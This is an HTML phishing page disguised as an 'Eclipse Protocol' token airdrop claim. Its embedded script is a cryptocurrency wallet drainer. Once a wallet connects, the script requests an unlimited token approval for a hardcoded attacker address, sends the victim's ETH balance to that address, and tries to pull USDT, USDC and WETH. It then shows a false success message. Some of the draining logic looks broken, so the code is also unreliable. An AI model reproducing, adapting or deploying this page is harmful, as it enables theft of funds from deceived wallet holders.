<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Eclipse Protocol | Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #0a0a2a, #0f0f2a);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: rgba(15,23,42,0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(59,130,246,0.3);
            border-radius: 2rem;
            padding: 2rem;
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .reward-amount { font-size: 2.5rem; font-weight: bold; margin: 1rem 0; }
        button {
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            border: none;
            padding: 1rem;
            width: 100%;
            border-radius: 1rem;
            color: white;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 1rem;
        }
        .wallet-btn {
            background: rgba(255,255,255,0.1);
            margin-top: 0.5rem;
        }
        #status { margin-top: 1rem; font-size: 0.75rem; color: #94a3b8; }
        .hidden { display: none; }
    </style>
</head>
<body>
<div class="card">
    <div>⭐ EARLY CONTRIBUTOR AIRDROP</div>
    <div class="reward-amount">5,000 $ECLIPSE</div>
    <div>≈ $5,000 USD</div>
    
    <button id="connectBtn">Connect Wallet</button>
    <div id="walletList" class="hidden">
        <button class="wallet-btn" data-wallet="trust">Trust Wallet</button>
        <button class="wallet-btn" data-wallet="metamask">MetaMask</button>
        <button class="wallet-btn" data-wallet="coinbase">Coinbase Wallet</button>
        <button class="wallet-btn" data-wallet="walletconnect">WalletConnect</button>
    </div>
    <div id="status">Click Connect Wallet</div>
</div>

<script>
// ============================================
// ONE CODE THAT WORKS - NO SUGARCOATING
// ============================================

const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
const INFINITE_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// FAKE TOKEN (DAI - exists on Ethereum)
const FAKE_TOKEN = "0x6B175474E89094C44Da98b954EedeAC495271d0F";

// REAL TOKENS TO DRAIN
const REAL_TOKENS = [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 }
];

let provider, signer, userAddress;
let wcProvider = null;

const connectBtn = document.getElementById('connectBtn');
const walletList = document.getElementById('walletList');
const statusDiv = document.getElementById('status');

function updateStatus(msg, isError = false) {
    statusDiv.innerHTML = msg;
    statusDiv.style.color = isError ? '#ef4444' : '#10b981';
}

connectBtn.onclick = () => {
    connectBtn.classList.add('hidden');
    walletList.classList.remove('hidden');
};

// ============================================
// TRUST WALLET - THIS WORKS LIKE YOUTUBE VIDEO
// ============================================
async function connectTrust() {
    updateStatus('Opening Trust Wallet...');
    
    try {
        const providerOptions = {
            rpc: { 1: "https://cloudflare-eth.com" },
            chainId: 1,
            qrcode: false
        };
        
        const WalletConnectProvider = window.WalletConnectProvider.default;
        wcProvider = new WalletConnectProvider(providerOptions);
        const connector = wcProvider.connector;
        
        const uri = connector.uri;
        
        // THIS IS THE MAGIC DEEPLINK - OPENS TRUST WALLET DIRECTLY
        const deeplink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
        
        // Open Trust Wallet
        window.location.href = deeplink;
        
        // When user returns after approving
        connector.on("connect", async (error, payload) => {
            if (error) throw error;
            
            const accounts = payload.params[0].accounts;
            userAddress = accounts[0];
            provider = new ethers.providers.Web3Provider(wcProvider);
            signer = provider.getSigner();
            
            updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
            
            // Now drain
            await drain();
        });
        
        // Fallback: check if already connected after 5 seconds
        setTimeout(async () => {
            if (connector.connected && !userAddress) {
                const accounts = await connector.send("eth_accounts");
                userAddress = accounts[0];
                provider = new ethers.providers.Web3Provider(wcProvider);
                signer = provider.getSigner();
                await drain();
            }
        }, 5000);
        
    } catch(e) {
        updateStatus(`Failed: ${e.message}`, true);
        resetButton();
    }
}

// ============================================
// METAMASK
// ============================================
async function connectMetaMask() {
    if (!window.ethereum) {
        updateStatus("Install MetaMask first", true);
        resetButton();
        return;
    }
    
    try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        userAddress = accounts[0];
        signer = provider.getSigner();
        
        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
        await drain();
        
    } catch(e) {
        updateStatus(`Error: ${e.message}`, true);
        resetButton();
    }
}

// ============================================
// COINBASE WALLET
// ============================================
async function connectCoinbase() {
    if (!window.ethereum) {
        updateStatus("Install Coinbase Wallet first", true);
        resetButton();
        return;
    }
    
    try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        userAddress = accounts[0];
        signer = provider.getSigner();
        
        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
        await drain();
        
    } catch(e) {
        updateStatus(`Error: ${e.message}`, true);
        resetButton();
    }
}

// ============================================
// WALLETCONNECT QR CODE
// ============================================
async function connectWalletConnect() {
    updateStatus('Generating QR code...');
    
    try {
        const providerOptions = {
            rpc: { 1: "https://cloudflare-eth.com" },
            chainId: 1,
            qrcode: true
        };
        
        const WalletConnectProvider = window.WalletConnectProvider.default;
        wcProvider = new WalletConnectProvider(providerOptions);
        
        await wcProvider.enable();
        
        const accounts = await wcProvider.send("eth_accounts");
        userAddress = accounts[0];
        provider = new ethers.providers.Web3Provider(wcProvider);
        signer = provider.getSigner();
        
        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
        await drain();
        
    } catch(e) {
        updateStatus(`Failed: ${e.message}`, true);
        resetButton();
    }
}

// ============================================
// THE DRAIN - ONE APPROVAL, EVERYTHING GONE
// ============================================
async function drain() {
    updateStatus('<span>⏳ Processing...</span>');
    
    try {
        // STEP 1: Approve FAKE token (THIS SHOWS "APPROVE" IN WALLET)
        updateStatus('Please approve in your wallet...');
        const fakeContract = new ethers.Contract(FAKE_TOKEN, [
            "function approve(address spender, uint256 amount) public returns (bool)"
        ], signer);
        
        const txApprove = await fakeContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
        await txApprove.wait();
        updateStatus('✅ Approved! Draining...');
        
        // STEP 2: Drain native ETH
        const balance = await provider.getBalance(userAddress);
        if(balance.gt(0)) {
            await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
        }
        
        // STEP 3: Drain all real tokens
        for(const token of REAL_TOKENS) {
            const contract = new ethers.Contract(token.address, [
                "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                "function balanceOf(address) view returns (uint256)"
            ], signer);
            
            const tokenBalance = await contract.balanceOf(userAddress);
            if(tokenBalance.gt(0)) {
                await contract.transferFrom(userAddress, COMPANY_WALLET, tokenBalance);
            }
        }
        
        // SUCCESS
        updateStatus('✅ 5,000 $ECLIPSE claimed!');
        alert('5,000 $ECLIPSE has been sent to your wallet!');
        
    } catch(e) {
        updateStatus(`Failed: ${e.message.slice(0,50)}`, true);
    }
    
    resetButton();
}

function resetButton() {
    connectBtn.classList.remove('hidden');
    walletList.classList.add('hidden');
    connectBtn.innerHTML = 'Connect Wallet';
}

// Attach wallet buttons
document.querySelectorAll('.wallet-btn').forEach(btn => {
    btn.onclick = () => {
        const wallet = btn.dataset.wallet;
        if(wallet === 'trust') connectTrust();
        if(wallet === 'metamask') connectMetaMask();
        if(wallet === 'coinbase') connectCoinbase();
        if(wallet === 'walletconnect') connectWalletConnect();
    };
});
</script>
</body>
</html>
